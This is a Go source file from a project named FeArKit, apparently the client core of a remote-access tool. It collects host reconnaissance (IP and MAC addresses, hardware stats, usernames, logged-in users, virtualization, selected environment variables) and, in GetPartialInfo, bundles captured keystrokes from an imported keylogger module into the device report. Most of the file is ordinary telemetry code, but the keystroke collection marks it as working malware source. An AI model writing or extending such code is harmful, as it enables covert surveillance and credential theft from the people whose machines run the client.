package core

import (
	"FeArKit/modules"
	"FeArKit/client/config"
	"FeArKit/client/service/keylogger"
	"errors"
	"github.com/denisbrodbeck/machineid"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/net"
	_net "net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

func isPrivateIP(ip _net.IP) bool {
	var privateIPBlocks []*_net.IPNet
	for _, cidr := range []string{
		//"127.0.0.0/8",    // IPv4 loopback
		//"::1/128",        // IPv6 loopback
		//"fe80::/10",      // IPv6 link-local
		"10.0.0.0/8",     // RFC1918
		"172.16.0.0/12",  // RFC1918
		"192.168.0.0/16", // RFC1918
	} {
		_, block, _ := _net.ParseCIDR(cidr)
		privateIPBlocks = append(privateIPBlocks, block)
	}
	for _, block := range privateIPBlocks {
		if block.Contains(ip) {
			return true
		}
	}
	return false
}

func GetLocalIP() (string, error) {
	ifaces, err := _net.Interfaces()
	if err != nil {
		return `<UNKNOWN>`, err
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			return `<UNKNOWN>`, err
		}

		for _, addr := range addrs {
			var ip _net.IP
			switch v := addr.(type) {
			case *_net.IPNet:
				ip = v.IP
			case *_net.IPAddr:
				ip = v.IP
			}
			if isPrivateIP(ip) {
				if addr := ip.To4(); addr != nil {
					return addr.String(), nil
				} else if addr := ip.To16(); addr != nil {
					return addr.String(), nil
				}
			}
		}
	}
	return `<UNKNOWN>`, errors.New(`no IP address found`)
}

func GetMacAddress() (string, error) {
	interfaces, err := _net.Interfaces()
	if err != nil {
		return ``, err
	}
	var address []string
	for _, i := range interfaces {
		a := i.HardwareAddr.String()
		if a != `` {
			address = append(address, a)
		}
	}
	if len(address) == 0 {
		return ``, nil
	}
	return strings.ToUpper(address[0]), nil
}

func GetNetIOInfo() (modules.Net, error) {
	result := modules.Net{}
	first, err := net.IOCounters(false)
	if err != nil {
		return result, nil
	}
	if len(first) == 0 {
		return result, errors.New(`failed to read network io counters`)
	}
	<-time.After(time.Second)
	second, err := net.IOCounters(false)
	if err != nil {
		return result, nil
	}
	if len(second) == 0 {
		return result, errors.New(`failed to read network io counters`)
	}
	result.Recv = second[0].BytesRecv - first[0].BytesRecv
	result.Sent = second[0].BytesSent - first[0].BytesSent
	return result, nil
}

func GetCPUInfo() (modules.CPU, error) {
	result := modules.CPU{}
	info, err := cpu.Info()
	if err != nil {
		return result, nil
	}
	if len(info) == 0 {
		return result, errors.New(`failed to read cpu info`)
	}
	result.Model = info[0].ModelName
	result.Cores.Logical, _ = cpu.Counts(true)
	result.Cores.Physical, _ = cpu.Counts(false)
	stat, err := cpu.Percent(3*time.Second, false)
	if err != nil {
		return result, nil
	}
	if len(stat) == 0 {
		return result, errors.New(`failed to read cpu info`)
	}
	result.Usage = stat[0]
	return result, nil
}

func GetRAMInfo() (modules.IO, error) {
	result := modules.IO{}
	stat, err := mem.VirtualMemory()
	if err != nil {
		return result, nil
	}
	result.Total = stat.Total
	result.Used = stat.Used
	result.Usage = float64(stat.Used) / float64(stat.Total) * 100
	return result, nil
}

func GetDiskInfo() (modules.IO, error) {
	devices := map[string]struct{}{}
	result := modules.IO{}
	disks, err := disk.Partitions(false)
	if err != nil {
		return result, nil
	}
	for i := 0; i < len(disks); i++ {
		if _, ok := devices[disks[i].Device]; !ok {
			devices[disks[i].Device] = struct{}{}
			stat, err := disk.Usage(disks[i].Mountpoint)
			if err == nil {
				result.Total += stat.Total
				result.Used += stat.Used
			}
		}
	}
	result.Usage = float64(result.Used) / float64(result.Total) * 100
	return result, nil
}

func GetDevice() (*modules.Device, error) {
	// Use the per-process runtime ID: unique per running instance and
	// stable across WS reconnects within the same process lifetime.
	id := config.RuntimeID
	localIP, err := GetLocalIP()
	if err != nil {
		localIP = `<UNKNOWN>`
	}
	macAddr, err := GetMacAddress()
	if err != nil {
		macAddr = `<UNKNOWN>`
	}
	cpuInfo, err := GetCPUInfo()
	if err != nil {
		cpuInfo = modules.CPU{
			Model: `<UNKNOWN>`,
			Usage: 0,
		}
	}
	netInfo, err := GetNetIOInfo()
	if err != nil {
		netInfo = modules.Net{
			Sent: 0,
			Recv: 0,
		}
	}
	ramInfo, err := GetRAMInfo()
	if err != nil {
		ramInfo = modules.IO{
			Total: 0,
			Used:  0,
			Usage: 0,
		}
	}
	diskInfo, err := GetDiskInfo()
	if err != nil {
		diskInfo = modules.IO{
			Total: 0,
			Used:  0,
			Usage: 0,
		}
	}
	uptime, err := host.Uptime()
	if err != nil {
		uptime = 0
	}
	hostname, err := os.Hostname()
	if err != nil {
		hostname = `<UNKNOWN>`
	}
	username, err := user.Current()
	if err != nil {
		username = &user.User{Username: `<UNKNOWN>`}
	} else {
		slashIndex := strings.Index(username.Username, `\`)
		if slashIndex > -1 && slashIndex+1 < len(username.Username) {
			username.Username = username.Username[slashIndex+1:]
		}
	}

	return &modules.Device{
		ID:           id,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		LAN:          localIP,
		MAC:          macAddr,
		CPU:          cpuInfo,
		RAM:          ramInfo,
		Net:          netInfo,
		Disk:         diskInfo,
		Uptime:       uptime,
		Hostname:     hostname,
		Username:     username.Username,
		KeyboardLayout: keylogger.GetKeyboardLayout(),
		ClientUptime: config.Config.ClientUptime,
		PID:          os.Getpid(),
	}, nil
}

// envKeys is the curated set of environment variables collected for metadata.
var envKeys = []string{
	// Windows
	`COMPUTERNAME`, `USERNAME`, `USERPROFILE`, `SYSTEMROOT`, `SYSTEMDRIVE`,
	`TEMP`, `TMP`, `OS`, `PROCESSOR_ARCHITECTURE`, `NUMBER_OF_PROCESSORS`,
	`PROGRAMFILES`, `PROGRAMFILES(X86)`, `PROGRAMDATA`, `APPDATA`, `LOCALAPPDATA`,
	`WINDIR`, `COMSPEC`, `PSMODULEPATH`,
	// Unix / macOS
	`HOME`, `USER`, `LOGNAME`, `SHELL`, `TERM`, `LANG`, `PWD`,
	`XDG_SESSION_TYPE`, `DISPLAY`, `DBUS_SESSION_BUS_ADDRESS`,
	// Cross-platform
	`PATH`,
}

func GetMetadata(wan string) (*modules.DeviceMetadata, error) {
	id, err := machineid.ProtectedID(`FeArKit`)
	if err != nil {
		id, _ = machineid.ID()
	}

	hostname, _ := os.Hostname()
	u, _ := user.Current()
	username := ``
	if u != nil {
		username = u.Username
		if idx := strings.Index(username, `\`); idx > -1 && idx+1 < len(username) {
			username = username[idx+1:]
		}
	}

	// OS / platform
	hostInfo, _ := host.Info()
	platform, platformFamily, platformVersion := ``, ``, ``
	kernelVersion, virtualization, timezone := ``, ``, ``
	var bootTime uint64
	if hostInfo != nil {
		platform = hostInfo.Platform
		platformFamily = hostInfo.PlatformFamily
		platformVersion = hostInfo.PlatformVersion
		kernelVersion = hostInfo.KernelVersion
		virtualization = hostInfo.VirtualizationSystem
		if hostInfo.VirtualizationRole != `` && hostInfo.VirtualizationRole != `host` {
			virtualization = hostInfo.VirtualizationSystem + ` (` + hostInfo.VirtualizationRole + `)`
		}
		bootTime = hostInfo.BootTime
		timezone = time.Local.String()
	}

	// Logged-in users
	var loggedUsers []string
	if users, err := host.Users(); err == nil {
		seen := map[string]bool{}
		for _, u := range users {
			if !seen[u.User] {
				loggedUsers = append(loggedUsers, u.User)
				seen[u.User] = true
			}
		}
	}

	// All network interfaces
	var ifaces []modules.NetworkInterface
	if ifs, err := _net.Interfaces(); err == nil {
		for _, iface := range ifs {
			ni := modules.NetworkInterface{
				Name: iface.Name,
				MAC:  strings.ToUpper(iface.HardwareAddr.String()),
			}
			for _, f := range []struct {
				flag _net.Flags
				name string
			}{
				{_net.FlagUp, `UP`}, {_net.FlagLoopback, `LOOPBACK`},
				{_net.FlagPointToPoint, `P2P`}, {_net.FlagMulticast, `MULTICAST`},
			} {
				if iface.Flags&f.flag != 0 {
					ni.Flags = append(ni.Flags, f.name)
				}
			}
			if addrs, err := iface.Addrs(); err == nil {
				for _, a := range addrs {
					ni.Addrs = append(ni.Addrs, a.String())
				}
			}
			ifaces = append(ifaces, ni)
		}
	}

	lan, _ := GetLocalIP()
	mac, _ := GetMacAddress()
	cpuInfo, _ := GetCPUInfo()
	ramInfo, _ := GetRAMInfo()
	diskInfo, _ := GetDiskInfo()

	// Environment variables
	env := map[string]string{}
	for _, k := range envKeys {
		if v := os.Getenv(k); v != `` {
			env[k] = v
		}
	}

	return &modules.DeviceMetadata{
		ID:              id,
		Hostname:        hostname,
		Username:        username,
		OS:              runtime.GOOS,
		Arch:            runtime.GOARCH,
		Platform:        platform,
		PlatformFamily:  platformFamily,
		PlatformVersion: platformVersion,
		KernelVersion:   kernelVersion,
		BootTime:        bootTime,
		Timezone:        timezone,
		Virtualization:  virtualization,
		WAN:             wan,
		LAN:             lan,
		Interfaces:      ifaces,
		CPU:             cpuInfo,
		RAM:             ramInfo,
		Disk:            diskInfo,
		MAC:             mac,
		PID:             os.Getpid(),
		ClientUptime:    config.Config.ClientUptime,
		Commit:          config.Commit,
		Users:           loggedUsers,
		Env:             env,
	}, nil
}

func GetPartialInfo() (*modules.Device, error) {
	uptime, err := host.Uptime()
	if err != nil {
		uptime = 0
	}
	return &modules.Device{
		Uptime: uptime,
		ClientUptime: config.Config.ClientUptime,
		KeyloggerData: keylogger.KeyloggerStorage.ReadAndClear(),
	}, nil
}
